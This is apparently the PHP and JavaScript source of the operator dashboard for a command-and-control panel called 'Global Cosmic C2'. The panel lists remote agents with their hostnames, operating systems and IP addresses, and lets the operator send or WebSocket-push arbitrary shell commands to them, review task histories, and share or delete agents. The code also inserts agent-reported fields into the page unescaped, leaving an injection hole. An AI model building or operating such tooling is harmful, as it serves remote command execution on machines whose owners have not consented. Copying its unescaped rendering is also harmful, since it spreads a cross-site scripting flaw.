<?php ob_start(); ?>
<div>
    <div class="flex justify-between items-center mb-6 flex-wrap gap-2">
        <h1 class="text-3xl font-bold cosmic-glow-text">🌍 Global Cosmic C2</h1>
        <button onclick="fetchAgents()" class="cosmic-btn"><i class="fas fa-sync"></i> Refresh</button>
    </div>

    <div class="cosmic-glass p-4 rounded-2xl overflow-auto">
        <div class="table-wrapper">
            <table class="w-full text-sm cosmic-table">
                <thead>
                    <tr><th>ID</th><th>Hostname</th><th>OS</th><th>IP</th><th>Last Seen</th><th>Status</th><th class="text-right">Actions</th></tr>
                </thead>
                <tbody id="agentsList">
                    <tr><td colspan="7" class="text-center text-gray-400">Loading agents...</td></tr>
                </tbody>
            </table>
        </div>
    </div>
</div>

<!-- Modal: View/Edit Agent -->
<div id="viewEditModal" class="modal-overlay">
    <div class="modal-content">
        <h2 id="veTitle" class="text-xl mb-4 cosmic-glow-text">Agent Details</h2>
        <div id="veContent"></div>
        <div class="flex gap-2 mt-4">
            <button onclick="saveEditAgent()" class="cosmic-btn flex-1">Save</button>
            <button type="button" onclick="closeModal('viewEditModal')" class="cosmic-btn flex-1">Close</button>
        </div>
    </div>
</div>

<script>
function closeModal(id) { document.getElementById(id).classList.remove('active'); }
function openModal(id) { document.getElementById(id).classList.add('active'); }

async function fetchAgents() {
    const res = await fetch('/c2/agents');
    const data = await res.json();
    let html = '';
    if (!data.agents || data.agents.length === 0) {
        html = '<tr><td colspan="7" class="text-center text-gray-400">No agents registered.</td></tr>';
    } else {
        data.agents.forEach(a => {
            html += `<tr>
                <td class="p-2">${a.id}</td>
                <td class="p-2">${a.hostname}</td>
                <td class="p-2">${a.os}</td>
                <td class="p-2">${a.ip_address}</td>
                <td class="p-2">${new Date(a.last_seen).toLocaleString()}</td>
                <td class="p-2"><span class="cosmic-badge ${a.status==='active'?'border-green-400 text-green-400':'border-gray-400 text-gray-400'}">${a.status}</span></td>
                <td class="p-2 text-right">
                    <button onclick="viewAgent(${a.id})" class="text-blue-400 hover:text-blue-300"><i class="fas fa-eye"></i></button>
                    <button onclick="editAgent(${a.id})" class="text-yellow-400 hover:text-yellow-300"><i class="fas fa-edit"></i></button>
                    <button onclick="sendCommand('${a.agent_id}')" class="text-purple-400 hover:text-purple-300"><i class="fas fa-terminal"></i></button>
                    <button onclick="pushCommand('${a.agent_id}')" class="text-blue-400" title="WebSocket Push"><i class="fas fa-bolt"></i></button>
                    <button onclick="shareAgent(${a.id})" class="text-green-400 hover:text-green-300"><i class="fas fa-share-alt"></i></button>
                    <button onclick="deleteAgent(${a.id})" class="text-red-400 hover:text-red-300"><i class="fas fa-trash"></i></button>
                </td>
            </tr>`;
        });
    }
    document.getElementById('agentsList').innerHTML = html;
}
fetchAgents();
setInterval(fetchAgents, 15000);

async function sendCommand(agentId) {
    const cmd = prompt('Enter command:');
    if (!cmd) return;
    const fd = new FormData(); fd.append('agent_id', agentId); fd.append('command', cmd);
    const res = await fetch('/c2/command', { method: 'POST', body: fd });
    const data = await res.json();
    alert(data.status || data.error);
}

async function pushCommand(agentId) {
    const cmd = prompt('Enter command to push via WebSocket:');
    if (!cmd) return;
    const fd = new FormData(); fd.append('agent_id', agentId); fd.append('command', cmd);
    const res = await fetch('/c2/push', { method: 'POST', body: fd });
    const data = await res.json();
    alert(data.status || data.error);
}

async function viewAgent(id) {
    const res = await fetch(`/c2/view?id=${id}`);
    const data = await res.json();
    const a = data.agent;
    let html = `<div class="space-y-2 text-sm">
        <p><strong>ID:</strong> ${a.id}</p>
        <p><strong>Agent ID:</strong> ${a.agent_id}</p>
        <p><strong>Hostname:</strong> ${a.hostname}</p>
        <p><strong>OS:</strong> ${a.os}</p>
        <p><strong>IP:</strong> ${a.ip_address}</p>
        <p><strong>Status:</strong> ${a.status}</p>
        <p><strong>Description:</strong> ${a.description || 'N/A'}</p>
        <p><strong>Tags:</strong> ${a.tags || 'N/A'}</p>
        <hr><h4>Tasks:</h4>`;
    if (data.tasks && data.tasks.length) {
        data.tasks.forEach(t => { html += `<div class="border-b border-white/10 py-1">[${t.status}] ${t.command}</div>`; });
    } else { html += '<p>No tasks.</p>'; }
    html += '</div>';
    document.getElementById('veContent').innerHTML = html;
    document.getElementById('veTitle').innerText = 'View Agent';
    openModal('viewEditModal');
    window._editId = null;
}

async function editAgent(id) {
    const res = await fetch(`/c2/view?id=${id}`);
    const data = await res.json();
    const a = data.agent;
    let html = `
        <input type="hidden" id="editId" value="${a.id}">
        <div class="mb-3"><label>Hostname</label><input type="text" id="editHostname" value="${a.hostname}" class="cosmic-input"></div>
        <div class="mb-3"><label>OS</label><input type="text" id="editOs" value="${a.os}" class="cosmic-input"></div>
        <div class="mb-3"><label>IP</label><input type="text" id="editIp" value="${a.ip_address}" class="cosmic-input"></div>
        <div class="mb-3"><label>Description</label><textarea id="editDesc" class="cosmic-input">${a.description || ''}</textarea></div>
        <div class="mb-3"><label>Tags</label><input type="text" id="editTags" value="${a.tags || ''}" class="cosmic-input"></div>
        <div class="mb-3"><label>Status</label><select id="editStatus" class="cosmic-input">
            <option value="active" ${a.status=='active'?'selected':''}>Active</option>
            <option value="inactive" ${a.status=='inactive'?'selected':''}>Inactive</option>
        </select></div>
    `;
    document.getElementById('veContent').innerHTML = html;
    document.getElementById('veTitle').innerText = 'Edit Agent';
    openModal('viewEditModal');
    window._editId = id;
}

async function saveEditAgent() {
    const id = window._editId || document.getElementById('editId').value;
    if (!id) return;
    const data = {
        id: id,
        hostname: document.getElementById('editHostname').value,
        os: document.getElementById('editOs').value,
        ip_address: document.getElementById('editIp').value,
        description: document.getElementById('editDesc').value,
        tags: document.getElementById('editTags').value,
        status: document.getElementById('editStatus').value
    };
    const res = await fetch('/c2/edit', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
    if (res.ok) { closeModal('viewEditModal'); location.reload(); } else { alert('Error updating agent'); }
}

async function shareAgent(id) {
    const res = await fetch(`/c2/share?id=${id}`);
    const data = await res.json();
    alert('Shareable link: ' + data.share_url);
}

async function deleteAgent(id) {
    if (!confirm('Delete this agent and all tasks?')) return;
    const fd = new FormData(); fd.append('id', id);
    await fetch('/c2/delete', { method: 'POST', body: fd });
    location.reload();
}
</script>
<?php $content = ob_get_clean(); require_once __DIR__ . '/../layout.php'; ?>
